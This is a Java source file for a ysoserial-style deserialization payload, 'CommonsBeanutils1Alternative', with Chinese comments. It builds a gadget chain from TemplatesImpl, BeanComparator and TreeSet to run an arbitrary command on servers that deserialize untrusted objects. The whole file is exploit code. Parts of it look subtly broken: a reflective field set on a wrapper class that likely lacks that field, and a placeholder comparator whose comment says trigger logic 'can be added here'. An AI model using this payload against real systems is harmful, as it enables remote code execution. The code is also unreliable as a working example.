package ysoserial.payloads;

import java.io.Serializable;
import java.util.Collections;
import java.util.Comparator;
import java.util.SortedSet;
import java.util.TreeSet;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({"frohoff"})
public class CommonsBeanutils1Alternative implements ObjectPayload<Serializable> {

    public CommonsBeanutils1Alternative() {
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1Alternative.class, args);
    }

    public Serializable getObject(String command) throws Exception {
        // 创建一个可以触发反序列化漏洞的 TemplatesImpl 对象
        Object templates = Gadgets.createTemplatesImpl(command);

        // 创建自定义的 BeanComparator，使用 TemplatesImpl 的方法作为比较依据
        BeanComparator comparator = new BeanComparator("outputProperties");

        // 使用 TreeSet 和自定义比较器
        TreeSet<Object> treeSet = new TreeSet<>(comparator);

        // 添加模板对象到 TreeSet
        treeSet.add(templates);
        treeSet.add(templates);

        // 使用 Collections.checkedSortedSet 来包装 TreeSet，确保类型安全
        @SuppressWarnings("unchecked")
        SortedSet<Object> checkedSet = Collections.checkedSortedSet(treeSet, Object.class);

        // 使用匿名内部类代替Lambda表达式
        Comparator<Object> anonymousComparator = new Comparator<Object>() {
            @Override
            public int compare(Object o1, Object o2) {
                // 这里可以添加触发漏洞的逻辑
                return 0; // 始终返回0，使得所有元素都被视为相等
            }
        };

        // 通过反射设置字段，触发反序列化漏洞
        Reflections.setFieldValue(checkedSet, "comparator", anonymousComparator);

        return checkedSet;
    }
}
